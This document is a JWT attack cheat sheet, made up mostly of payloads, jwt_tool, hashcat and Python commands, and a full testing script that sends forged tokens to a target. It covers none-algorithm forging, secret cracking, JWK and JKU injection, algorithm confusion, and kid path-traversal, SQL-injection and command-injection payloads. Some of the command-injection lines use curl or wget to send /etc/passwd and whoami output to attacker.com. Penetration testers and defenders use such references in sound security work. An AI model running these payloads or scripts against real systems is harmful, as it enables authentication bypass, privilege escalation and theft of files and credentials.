# JWT Attacks - Complete Cheat Sheet

Comprehensive payload collection and command reference for JWT exploitation.

---

## Table of Contents

1. [JWT Structure](#jwt-structure)
2. [Attack Payloads](#attack-payloads)
3. [Tool Commands](#tool-commands)
4. [Burp Suite Workflows](#burp-suite-workflows)
5. [Python Scripts](#python-scripts)
6. [Bypass Techniques](#bypass-techniques)
7. [Testing Checklist](#testing-checklist)

---

## JWT Structure

### Basic Format
```
HEADER.PAYLOAD.SIGNATURE
```

### Header Examples
```json
// HS256 (HMAC with SHA-256)
{
  "alg": "HS256",
  "typ": "JWT"
}

// RS256 (RSA with SHA-256)
{
  "alg": "RS256",
  "typ": "JWT"
}

// None (unsigned)
{
  "alg": "none",
  "typ": "JWT"
}

// With Key ID
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key-id-1"
}

// With JWK
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "n": "..."
  }
}

// With JKU
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://example.com/jwks.json"
}
```

### Payload Examples
```json
// Basic claims
{
  "sub": "user123",
  "iat": 1516239022,
  "exp": 1516242622
}

// With roles
{
  "sub": "user123",
  "role": "admin",
  "permissions": ["read", "write", "delete"]
}

// Multi-tenant
{
  "sub": "user123",
  "tenant_id": "tenant-a",
  "org_id": "org-1"
}
```

---

## Attack Payloads

### 1. Signature Verification Bypass

**Modify Claims Without Re-Signing:**
```json
// Original
{"sub": "user", "role": "user"}

// Modified (keep original signature)
{"sub": "admin", "role": "admin"}
```

**Test Command:**
```python
import jwt
token = "eyJ..."
# Decode without verification
payload = jwt.decode(token, options={"verify_signature": False})
# Modify
payload['sub'] = 'admin'
# Re-encode (signature will be invalid but might be accepted)
new_token = jwt.encode(payload, "ignored", algorithm="HS256")
```

---

### 2. None Algorithm

**Header Payload:**
```json
{
  "alg": "none",
  "typ": "JWT"
}
```

**Variations:**
```json
{"alg": "None"}
{"alg": "NONE"}
{"alg": "nOnE"}
{"alg": "NoNe"}
{"alg": " none"}
{"alg": "none "}
{"alg": null}
{"alg": ""}
```

**Token Format:**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
```
*Note the trailing dot with no signature*

**Python Generation:**
```python
import base64
import json

header = base64.urlsafe_b64encode(
    json.dumps({"alg":"none","typ":"JWT"}).encode()
).decode().rstrip('=')

payload = base64.urlsafe_b64encode(
    json.dumps({"sub":"admin"}).encode()
).decode().rstrip('=')

token = f"{header}.{payload}."
```

**Bash One-Liner:**
```bash
echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=' && echo -n '.' && echo -n '{"sub":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=' && echo '.'
```

---

### 3. Weak Secret Attacks

**Common Weak Secrets:**
```
secret
password
secret1
secret123
secretkey
mysecretkey
your-256-bit-secret
your-secret-key
changeit
admin
qwerty
123456
jwt_secret
default
key
private
```

**Hashcat Commands:**
```bash
# HS256
hashcat -a 0 -m 16500 jwt.txt jwt.secrets.list

# HS384
hashcat -a 0 -m 16511 jwt.txt jwt.secrets.list

# HS512
hashcat -a 0 -m 16512 jwt.txt jwt.secrets.list

# Brute force (6 chars, lowercase)
hashcat -a 3 -m 16500 jwt.txt ?l?l?l?l?l?l

# With rules
hashcat -a 0 -m 16500 jwt.txt wordlist.txt -r rules/best64.rule

# GPU optimization
hashcat -a 0 -m 16500 jwt.txt wordlist.txt -w 3 -O

# Show cracked
hashcat -m 16500 jwt.txt --show
```

**John the Ripper:**
```bash
# Crack
john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt

# Show results
john --show jwt.txt
```

**Python Quick Test:**
```python
import jwt

token = "eyJ..."
common_secrets = [
    "secret", "secret1", "password", "admin",
    "your-256-bit-secret", "jwt_secret"
]

for secret in common_secrets:
    try:
        jwt.decode(token, secret, algorithms=['HS256'])
        print(f"Found secret: {secret}")
        break
    except:
        continue
```

---

### 4. JWK Injection

**Malicious Header:**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "use": "sig",
    "kid": "attacker-key",
    "alg": "RS256",
    "n": "xGOr-H7A8JakwqmHC9Z..."
  }
}
```

**Python Generation:**
```python
from jwcrypto import jwk, jwt as jwt_crypto
import json

# Generate key pair
key = jwk.JWK.generate(kty='RSA', size=2048)

# Create header with embedded JWK
header = {
    "alg": "RS256",
    "typ": "JWT",
    "jwk": json.loads(key.export_public())
}

payload = {"sub": "admin"}

# Sign with private key
token = jwt_crypto.JWT(header=header, claims=payload)
token.make_signed_token(key)
print(token.serialize())
```

**jwt_tool Command:**
```bash
python3 jwt_tool.py JWT -X i -pc sub -pv admin
```

---

### 5. JKU Injection

**Malicious Header:**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "attacker-key-1",
  "jku": "https://attacker.com/jwks.json"
}
```

**JWK Set Format (jwks.json):**
```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key-1",
      "use": "sig",
      "alg": "RS256",
      "n": "0vx7agoebGcQSuuPiLJXZptN9nn...",
      "e": "AQAB"
    }
  ]
}
```

**Host JWK Set:**
```bash
# Simple HTTP server
echo '{"keys":[...]}' > jwks.json
python3 -m http.server 8080

# ngrok tunnel
ngrok http 8080
```

**jwt_tool Command:**
```bash
python3 jwt_tool.py JWT -X s -ju https://attacker.com/jwks.json -pc sub -pv admin
```

**SSRF Payloads:**
```json
// AWS metadata
{"jku": "http://169.254.169.254/latest/meta-data/"}

// Internal network
{"jku": "http://192.168.1.1:8080/jwks.json"}

// Localhost
{"jku": "http://localhost:8080/admin/jwks.json"}
```

---

### 6. Kid Header Exploitation

#### Path Traversal Payloads

**Linux/Unix:**
```json
{"kid": "../../../../../../../dev/null"}
{"kid": "../../../../../../../etc/passwd"}
{"kid": "../../../../../../../etc/hostname"}
{"kid": "../../../../../../../proc/version"}
{"kid": "../../../../../../../proc/sys/kernel/hostname"}
{"kid": "../../../../../../app/config/keys/public.key"}
{"kid": "../../../../../../var/www/html/.env"}
```

**Windows:**
```json
{"kid": "..\\..\\..\\..\\..\\..\\windows\\win.ini"}
{"kid": "..\\..\\..\\..\\..\\..\\windows\\system.ini"}
{"kid": "C:\\windows\\win.ini"}
```

**Path Traversal Variations:**
```
../../../../../../../dev/null
..././..././..././dev/null
....//....//....//dev/null
..;/..;/..;/..;/dev/null
%2e%2e%2f%2e%2e%2f%2e%2e%2fdev/null
```

**Python Exploitation:**
```python
import jwt
import base64

# For /dev/null (returns null bytes)
header = {
    "alg": "HS256",
    "kid": "../../../../../../../dev/null"
}

payload = {"sub": "admin"}

# Secret: null byte
secret = base64.b64decode('AA==')  # \x00

token = jwt.encode(payload, secret, algorithm='HS256', headers=header)
```

**jwt_tool Command:**
```bash
python3 jwt_tool.py JWT -I -hc kid -hv "../../../../../../../dev/null" -pc sub -pv admin -S
```

#### SQL Injection Payloads

```json
// Authentication bypass
{"kid": "' OR '1'='1"}
{"kid": "' OR 1=1--"}
{"kid": "admin'--"}

// Union-based
{"kid": "x' UNION SELECT 'known-secret'--"}
{"kid": "' UNION SELECT NULL,NULL,'secret'--"}

// Time-based blind
{"kid": "' OR SLEEP(5)--"}
{"kid": "'; WAITFOR DELAY '00:00:05'--"}

// Boolean-based blind
{"kid": "' AND 1=1--"}
{"kid": "' AND 1=2--"}
```

#### Command Injection Payloads

```json
{"kid": "key; cat /etc/passwd #"}
{"kid": "key`whoami`"}
{"kid": "key$(cat /etc/passwd)"}
{"kid": "key;wget http://attacker.com/`whoami`"}
{"kid": "key|curl http://attacker.com/?data=$(cat /etc/passwd)"}
```

---

### 7. Algorithm Confusion (RS256 → HS256)

**Header Change:**
```json
// Original
{"alg": "RS256", "typ": "JWT"}

// Modified
{"alg": "HS256", "typ": "JWT"}
```

**Python Exploitation:**
```python
import jwt
import requests
import base64

# Step 1: Fetch public key
response = requests.get('https://api.example.com/jwks.json')
jwks = response.json()
public_jwk = jwks['keys'][0]

# Step 2: Convert JWK to PEM
from jwcrypto import jwk as jwk_lib
key = jwk_lib.JWK(**public_jwk)
public_pem = key.export_to_pem()

# Step 3: Sign with HS256 using public key as secret
header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "admin"}

token = jwt.encode(
    payload,
    public_pem,  # Public key as HMAC secret
    algorithm='HS256',
    headers=header
)

print(token)
```

**jwt_tool Command:**
```bash
# Extract public key first
curl https://api.example.com/jwks.json > jwks.json

# Then attack
python3 jwt_tool.py JWT -X k -pk public.pem -pc sub -pv admin
```

**Public Key Formats:**

PEM Format:
```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0vx7agoebGcQSuuPiLJX
...
-----END PUBLIC KEY-----
```

JWK Format:
```json
{
  "kty": "RSA",
  "e": "AQAB",
  "use": "sig",
  "kid": "key-1",
  "alg": "RS256",
  "n": "0vx7agoebGcQSuuPiLJXZptN..."
}
```

---

## Tool Commands

### jwt_tool

**Installation:**
```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip3 install -r requirements.txt
```

**Basic Commands:**
```bash
# Decode and display
python3 jwt_tool.py JWT

# Scan all attacks
python3 jwt_tool.py JWT -M at

# Test against URL
python3 jwt_tool.py JWT -M at -t "https://api.example.com/endpoint"
```

**Specific Attacks:**
```bash
# None algorithm
python3 jwt_tool.py JWT -X a

# JWK injection
python3 jwt_tool.py JWT -X i

# JKU injection
python3 jwt_tool.py JWT -X s -ju https://attacker.com/jwks.json

# Kid injection
python3 jwt_tool.py JWT -X k

# Algorithm confusion
python3 jwt_tool.py JWT -X a

# Crack secret
python3 jwt_tool.py JWT -C -d wordlist.txt

# Tamper payload
python3 jwt_tool.py JWT -T

# Inject header value
python3 jwt_tool.py JWT -I -hc kid -hv "../../dev/null"

# Inject payload claim
python3 jwt_tool.py JWT -I -pc sub -pv admin

# Sign with known secret
python3 jwt_tool.py JWT -S -p "secret123"
```

**Advanced Options:**
```bash
# Custom header and payload
python3 jwt_tool.py JWT -I -hc kid -hv "test" -pc sub -pv admin -S -p "secret"

# Resign with algorithm
python3 jwt_tool.py JWT -S -p "secret" -A hs256

# Target URL with injection
python3 jwt_tool.py JWT -t "https://api.com/verify" -rh "Authorization: Bearer JWT" -M pb
```

---

### hashcat

**JWT Hash Modes:**
```bash
16500 = JWT (HS256)
16511 = JWT (HS384)
16512 = JWT (HS512)
```

**Attack Modes:**
```bash
# Dictionary attack
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# Combinator attack
hashcat -a 1 -m 16500 jwt.txt wordlist1.txt wordlist2.txt

# Mask attack (brute force)
hashcat -a 3 -m 16500 jwt.txt ?l?l?l?l?l?l?l?l

# Hybrid attack
hashcat -a 6 -m 16500 jwt.txt wordlist.txt ?d?d?d?d
```

**Performance Optimization:**
```bash
# GPU optimization
hashcat -a 0 -m 16500 jwt.txt wordlist.txt -O

# Workload profile (high = 3)
hashcat -a 0 -m 16500 jwt.txt wordlist.txt -w 3

# GPU selection
hashcat -a 0 -m 16500 jwt.txt wordlist.txt -d 1

# Show progress
hashcat -a 0 -m 16500 jwt.txt wordlist.txt --status

# Session management
hashcat -a 0 -m 16500 jwt.txt wordlist.txt --session jwt_crack
hashcat --session jwt_crack --restore
```

**Mask Examples:**
```bash
# 8 lowercase letters
?l?l?l?l?l?l?l?l

# "secret" + 4 digits
secret?d?d?d?d

# 6-8 characters, any
?a?a?a?a?a?a?a?a

# Custom charset
-1 ?l?u -a 3 jwt.txt ?1?1?1?1?1?1
```

---

### Burp Suite

**JWT Editor Extension:**

**Key Generation:**
```
JWT Editor Keys tab
→ New RSA Key / New Symmetric Key
→ Generate
→ Save with descriptive name
```

**Token Modification:**
```
Repeater tab
→ JSON Web Token tab (appears automatically)
→ Modify header/payload
→ Sign (if needed)
→ Send
```

**Attacks:**
```
JSON Web Token tab
→ Attack menu
→ Embedded JWK / Sign with JWK
→ Select key
→ OK
```

**Workflows:**

None Algorithm:
```
1. JSON Web Token tab
2. Header → alg = "none"
3. Remove signature manually
4. Ensure trailing dot
5. Send
```

Weak Secret:
```
1. Copy JWT
2. External crack (hashcat)
3. JWT Editor Keys → New Symmetric Key
4. k = base64(found_secret)
5. Sign token
```

JWK Injection:
```
1. JWT Editor Keys → New RSA Key
2. JSON Web Token tab → Attack → Embedded JWK
3. Select generated key
4. Modify payload
5. Send
```

Algorithm Confusion:
```
1. Fetch /jwks.json
2. JWT Editor Keys → New RSA Key → Paste JWK
3. Export as PEM
4. Decoder → Base64 encode PEM
5. JWT Editor Keys → New Symmetric Key → k = encoded_PEM
6. JSON Web Token tab → alg = "HS256"
7. Sign with symmetric key
```

---

## Python Scripts

### Complete JWT Testing Script

```python
#!/usr/bin/env python3
import jwt
import base64
import json
import requests
from typing import Optional

class JWTTester:
    def __init__(self, token: str, target_url: str = None):
        self.token = token
        self.target_url = target_url
        self.header = jwt.get_unverified_header(token)
        self.payload = jwt.decode(token, options={"verify_signature": False})

    def test_no_verification(self) -> bool:
        """Test if signature verification is enforced"""
        # Modify payload
        modified_payload = self.payload.copy()
        modified_payload['sub'] = 'admin'

        # Keep original header and signature
        parts = self.token.split('.')
        new_payload = base64.urlsafe_b64encode(
            json.dumps(modified_payload).encode()
        ).decode().rstrip('=')

        modified_token = f"{parts[0]}.{new_payload}.{parts[2]}"

        return self._test_token(modified_token)

    def test_none_algorithm(self) -> Optional[str]:
        """Test none algorithm acceptance"""
        header = {"alg": "none", "typ": "JWT"}
        payload = self.payload.copy()
        payload['sub'] = 'admin'

        header_enc = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).decode().rstrip('=')

        payload_enc = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip('=')

        none_token = f"{header_enc}.{payload_enc}."

        if self._test_token(none_token):
            return none_token
        return None

    def crack_secret(self, wordlist_file: str) -> Optional[str]:
        """Attempt to crack JWT secret"""
        with open(wordlist_file, 'r') as f:
            for line in f:
                secret = line.strip()
                try:
                    jwt.decode(
                        self.token,
                        secret,
                        algorithms=['HS256', 'HS384', 'HS512']
                    )
                    return secret
                except:
                    continue
        return None

    def forge_token(self, secret: str, claims: dict = None) -> str:
        """Forge token with known secret"""
        payload = self.payload.copy()
        if claims:
            payload.update(claims)

        return jwt.encode(
            payload,
            secret,
            algorithm=self.header.get('alg', 'HS256')
        )

    def _test_token(self, token: str) -> bool:
        """Test if token is accepted by application"""
        if not self.target_url:
            return False

        try:
            response = requests.get(
                self.target_url,
                headers={'Authorization': f'Bearer {token}'},
                timeout=5
            )
            return response.status_code == 200
        except:
            return False

    def run_all_tests(self):
        """Run comprehensive test suite"""
        print("[*] Testing JWT Security")
        print(f"[*] Token: {self.token[:50]}...")
        print(f"[*] Header: {self.header}")
        print(f"[*] Payload: {self.payload}")
        print()

        # Test 1: Signature verification
        print("[*] Test 1: Signature Verification Bypass")
        if self.test_no_verification():
            print("  [!] VULNERABLE: Signature not verified!")
        else:
            print("  [+] Secure: Signature verification enforced")
        print()

        # Test 2: None algorithm
        print("[*] Test 2: None Algorithm")
        none_token = self.test_none_algorithm()
        if none_token:
            print(f"  [!] VULNERABLE: None algorithm accepted!")
            print(f"  [+] Token: {none_token}")
        else:
            print("  [+] Secure: None algorithm rejected")
        print()

        # Test 3: Weak secret (limited test)
        print("[*] Test 3: Weak Secret")
        common_secrets = ['secret', 'secret1', 'password', 'admin']
        found_secret = None
        for secret in common_secrets:
            try:
                jwt.decode(self.token, secret, algorithms=['HS256'])
                found_secret = secret
                break
            except:
                continue

        if found_secret:
            print(f"  [!] VULNERABLE: Weak secret found: {found_secret}")
            forged = self.forge_token(found_secret, {'sub': 'admin'})
            print(f"  [+] Forged token: {forged[:50]}...")
        else:
            print("  [?] No common weak secret found (try full wordlist)")
        print()

# Usage
if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 jwt_tester.py <JWT> [target_url]")
        sys.exit(1)

    token = sys.argv[1]
    target_url = sys.argv[2] if len(sys.argv) > 2 else None

    tester = JWTTester(token, target_url)
    tester.run_all_tests()
```

### Quick One-Liners

**Decode JWT:**
```python
python3 -c "import jwt,sys; print(jwt.decode(sys.argv[1], options={'verify_signature':False}))" "eyJ..."
```

**Create None Token:**
```python
python3 -c "import base64,json; h=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('='); p=base64.urlsafe_b64encode(json.dumps({'sub':'admin'}).encode()).decode().rstrip('='); print(f'{h}.{p}.')"
```

**Test Weak Secret:**
```python
python3 -c "import jwt,sys; [print(f'Found: {s}') or exit() for s in ['secret','secret1','password'] if not jwt.decode(sys.argv[1],s,algorithms=['HS256'],options={'verify_signature':True}) is None]" "eyJ..."
```

**Forge Token:**
```python
python3 -c "import jwt,sys; print(jwt.encode({'sub':'admin'}, sys.argv[1], algorithm='HS256'))" "secret123"
```

---

## Bypass Techniques

### Algorithm Blacklist Bypass

**Case Variations:**
```json
{"alg": "none"}
{"alg": "None"}
{"alg": "NONE"}
{"alg": "nOnE"}
{"alg": "NoNe"}
```

**Whitespace:**
```json
{"alg": " none"}
{"alg": "none "}
{"alg": "\tnone"}
{"alg": "none\r\n"}
```

**Encoding:**
```json
{"alg": "n\u006fne"}  // Unicode escape
{"alg": "no\x6ee"}    // Hex escape
```

**Type Confusion:**
```json
{"alg": null}
{"alg": 0}
{"alg": false}
{"alg": ""}
{"alg": []}
{"alg": {}}
```

---

### Signature Stripping

**Remove Signature:**
```
Original: header.payload.signature
Modified: header.payload.
```

**Null Signature:**
```python
null_sig = base64.urlsafe_b64encode(b'\x00').decode()
token = f"{header}.{payload}.{null_sig}"
```

---

### Header Parameter Pollution

**Multiple Parameters:**
```json
{
  "alg": "HS256",
  "kid": "safe-key",
  "kid": "../../etc/passwd"  // Second kid might be used
}
```

**Parameter Injection:**
```json
{
  "alg": "RS256",
  "jwk": {...},
  "jku": "https://attacker.com",
  "kid": "../../dev/null"
}
```

---

### URL Encoding Bypass

**Path Traversal:**
```
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
..%252f..%252f..%252fetc%252fpasswd
```

**JKU Domain Validation:**
```
https://trusted.com@attacker.com/jwks.json
https://attacker.com/trusted.com/jwks.json
https://trusted.com.attacker.com/jwks.json
```

---

## Testing Checklist

### Discovery Phase

- [ ] Identify JWT usage (Authorization header, cookies)
- [ ] Decode token structure
- [ ] Document algorithm (alg claim)
- [ ] Check for header parameters (kid, jwk, jku, x5u, x5c)
- [ ] Document standard claims (sub, iss, aud, exp)
- [ ] Identify custom claims
- [ ] Check token expiration handling

### Vulnerability Testing

**Signature Verification:**
- [ ] Modify claims without re-signing
- [ ] Test if invalid signature accepted
- [ ] Test signature stripping
- [ ] Test empty signature

**Algorithm Tests:**
- [ ] None algorithm acceptance
- [ ] Algorithm case variations
- [ ] Algorithm confusion (RS256→HS256)
- [ ] Algorithm downgrade attacks

**Secret Strength:**
- [ ] Test common weak secrets
- [ ] Dictionary attack (5-10 min max)
- [ ] Check for default secrets
- [ ] Test empty/null secret

**Header Parameter Injection:**
- [ ] JWK injection (embed public key)
- [ ] JKU injection (external key fetch)
- [ ] Kid path traversal
- [ ] Kid SQL injection
- [ ] Kid command injection
- [ ] X5u/x5c certificate injection

**Token Manipulation:**
- [ ] Privilege escalation via claims
- [ ] Expiration bypass
- [ ] Issuer spoofing
- [ ] Audience bypass
- [ ] Multi-tenant access

### Exploitation Validation

- [ ] Confirm administrative access
- [ ] Test privilege escalation
- [ ] Attempt unauthorized actions
- [ ] Test persistence of exploit
- [ ] Document impact clearly

### Reporting

- [ ] Vulnerability type and severity
- [ ] Affected endpoints
- [ ] Reproduction steps
- [ ] Proof of concept code
- [ ] Impact assessment
- [ ] Remediation recommendations

---

## Quick Command Reference

```bash
# Decode JWT
echo "eyJ..." | cut -d. -f1 | base64 -d

# Test signature verification
jwt_tool.py JWT -T -pc sub -pv admin

# Test none algorithm
jwt_tool.py JWT -X a

# Crack secret
hashcat -a 0 -m 16500 jwt.txt jwt.secrets.list

# JWK injection
jwt_tool.py JWT -X i

# JKU injection
jwt_tool.py JWT -X s -ju https://attacker.com/jwks.json

# Kid injection
jwt_tool.py JWT -I -hc kid -hv "../../dev/null"

# Algorithm confusion
jwt_tool.py JWT -X k -pk public.pem
```

---

## Common Vulnerabilities Summary

| Vulnerability | Impact | Complexity | Detection |
|--------------|--------|------------|-----------|
| No signature verification | Critical | Very Low | Immediate |
| None algorithm | Critical | Very Low | Immediate |
| Weak secret | Critical | Low | 5-30 min |
| JWK injection | High | Low | 2-3 min |
| JKU injection | High | Low-Medium | 3-5 min |
| Kid traversal | High | Low | 2-3 min |
| Algorithm confusion | High | Medium | 5-10 min |

---

**Always obtain proper authorization before testing. JWT vulnerabilities can lead to complete authentication bypass and system compromise.**
